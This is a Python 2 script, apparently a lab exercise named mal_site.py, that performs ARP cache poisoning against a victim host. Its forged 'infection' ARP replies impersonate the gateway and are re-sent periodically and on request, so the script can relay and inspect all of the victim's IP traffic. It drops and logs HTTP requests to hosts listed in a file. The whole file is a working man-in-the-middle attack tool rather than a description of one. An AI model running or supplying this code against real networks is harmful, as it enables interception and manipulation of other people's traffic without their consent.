import netifaces
import sys
import threading
import time
import re

import pcap

from urlparse import urlparse

from packets import *

mal_sites = set()
my_mac = None
victim_ip = None
victim_mac = None
gateway_ip = None
gateway_mac = None


def send_periodically(infection_reply, interval_in_second=20):
    pcap_handle = pcap.pcap(timeout_ms=0)
    pcap_handle.setfilter('arp')
    while True:
        pcap_handle.sendpacket(infection_reply.as_bytes())
        print '[<+] Periodical packet sent'
        time.sleep(interval_in_second)


def reply_to_request(infection_reply):
    pcap_handle = pcap.pcap(timeout_ms=0)
    pcap_handle.setfilter('arp')
    while True:
        try:
            for capture in pcap_handle:
                if capture is None:
                    continue
                time_stamp, packet = capture
                arp = ARP(packet)
                if arp.operation == ARP.OP_REQUEST \
                        and arp.sender_protocol_address == victim_ip \
                        and arp.sender_hardware_address == victim_mac \
                        and arp.target_protocol_address == gateway_ip:
                    print "[>+] Received victim's request for ip '{}'".format(gateway_ip.in_string)

                    pcap_handle.sendpacket(infection_reply.as_bytes())
                    print '[<+] Sent victim attack packet'
        except KeyboardInterrupt:
            return
        except:
            pass

        print 'following request of gateway stopped unexpectedly. restarting.'
        pcap_handle = pcap.pcap(timeout_ms=0)


def follow_request_of_gateway(infection_request):
    pcap_handle = pcap.pcap(timeout_ms=0)
    pcap_handle.setfilter('arp')
    while True:
        try:
            for capture in pcap_handle:
                if capture is None:
                    continue
                time_stamp, packet = capture
                arp = ARP(packet)
                if arp.operation == ARP.OP_REQUEST \
                        and arp.ethernet.destination_mac == Ethernet.BROADCAST \
                        and arp.sender_protocol_address == gateway_ip \
                        and arp.sender_hardware_address == gateway_mac:
                    print "[>!] Detected gateway's arp request".format(gateway_ip)

                    pcap_handle.sendpacket(infection_request.as_bytes())
                    print '[<!] Sent victim infection request'
        except KeyboardInterrupt:
            return
        except:
            pass

        print 'relaying ip stopped unexpectedly. restarting.'
        pcap_handle = pcap.pcap(timeout_ms=0)


def filter_and_relay_ip():
    pcap_handle = pcap.pcap(timeout_ms=0)
    pcap_handle.setfilter('ip src host {}'.format(victim_ip.in_string))
    while True:
        try:
            for capture in pcap_handle:
                if capture is None:
                    continue
                time_stamp, packet = capture
                print "[>!]got victim's ip packet to gateway."
                relaying_packet = IP(packet)
                if relaying_packet.protocol == IP.PROTOCOL_TCP:
                    relaying_tcp = TCP(packet)
                    first_line = relaying_tcp.payload.split('\n', 1)[0]
                    if 'HTTP/' in first_line:
                        try:
                            host = re.search(r'\nHost: (.*)', relaying_tcp.payload).group(1)
                            if host in mal_sites:
                                with open('log.txt', 'a') as log_file:
                                    log_file.write('{} tried to access mal site {}\n'.format(victim_ip.in_string, host))

                                continue  # don't relay
                        except:
                            pass

                relaying_packet.ethernet.source_mac = my_mac
                relaying_packet.ethernet.destination_mac = gateway_mac
                pcap_handle.sendpacket(relaying_packet.as_bytes())
                print '[<!]sent relay.'
        except:
            pass

        print 'relaying ip stopped unexpectedly. restarting.'
        pcap_handle = pcap.pcap(timeout_ms=0)


def main():
    global my_mac, victim_ip, victim_mac, gateway_ip, gateway_mac, mal_sites
    if len(sys.argv) not in (2, 3):
        print 'Usage: python mal_site.py victim_ip [interface_name]'
        exit(1)

    with open('mal_site.txt') as f:
        for url in f.read().splitlines():
            mal_sites.add(urlparse(url).netloc)

    gateways = netifaces.gateways()
    interface_name = pcap.lookupdev()
    addresses = netifaces.ifaddresses(interface_name)

    my_mac = MacAddress(addresses[netifaces.AF_LINK][0]['addr'])
    my_ip = IPv4Address(addresses[netifaces.AF_INET][0]['addr'])
    if len(sys.argv) == 2:
        try:
            gateway_ip = IPv4Address(gateways[netifaces.AF_INET][0][0])
        except KeyError:
            print 'No internet gateway detected.'
            exit(1)
    else:
        for address, interface, is_default in gateways[netifaces.AF_INET]:
            if interface == sys.argv[2]:
                gateway_ip = address
                break
        else:
            print 'There is no interface named {}'.format(sys.argv[2])
            exit(1)
    victim_ip = IPv4Address(sys.argv[1])
    print

    print 'my      mac: {}'.format(my_mac.in_string)
    print 'my      ip : {}'.format(my_ip.in_string)
    print 'gateway ip : {}'.format(gateway_ip.in_string)
    print 'victim  ip : {}'.format(victim_ip.in_string)

    pcap_handle = pcap.pcap(timeout_ms=0)
    pcap_handle.setfilter('arp')
    # ask gateway its mac address
    asking_arp = normal_request_arp(my_mac, my_ip, gateway_ip)
    pcap_handle.sendpacket(asking_arp.as_bytes())
    print '[<+] Sent gateway({}) an ARP request'.format(gateway_ip.in_string)
    for capture in pcap_handle:
        if capture is None:
            continue
        time_stamp, packet = capture
        arp = ARP(packet)
        if arp.operation == ARP.OP_REPLY and arp.sender_protocol_address == gateway_ip:
            gateway_mac = arp.sender_hardware_address
            print "[>+] gateway replied its mac is '{}'".format(gateway_mac.in_string)
            break
    else:
        raise RuntimeError('Packet capture ended unexpectedly.')

    # ask victim his mac address
    asking_arp = normal_request_arp(my_mac, my_ip, victim_ip)
    pcap_handle.sendpacket(asking_arp.as_bytes())
    print '[<+] Sent victim({}) an ARP request'.format(victim_ip.in_string)

    # wait for victim's response
    for capture in pcap_handle:
        if capture is None:
            continue
        time_stamp, packet = capture
        arp = ARP(packet)
        if arp.operation == ARP.OP_REPLY and arp.sender_protocol_address == victim_ip:
            victim_mac = arp.sender_hardware_address
            print "[>+] victim replied his mac is '{}'".format(victim_mac.in_string)
            break
    else:
        raise RuntimeError('Packet capture ended unexpectedly.')

    # attack packet
    infection_reply = normal_reply_arp(my_mac, gateway_ip, victim_mac, victim_ip)
    infection_request = normal_request_arp(my_mac, gateway_ip, my_ip)

    replier = threading.Thread(target=reply_to_request, args=(infection_reply,))
    periodical = threading.Thread(target=send_periodically, args=(infection_reply,))
    gateway_follower = threading.Thread(target=follow_request_of_gateway, args=(infection_request,))

    replier.start()
    periodical.start()
    gateway_follower.start()

    filter_and_relay_ip()


if __name__ == '__main__':
    main()
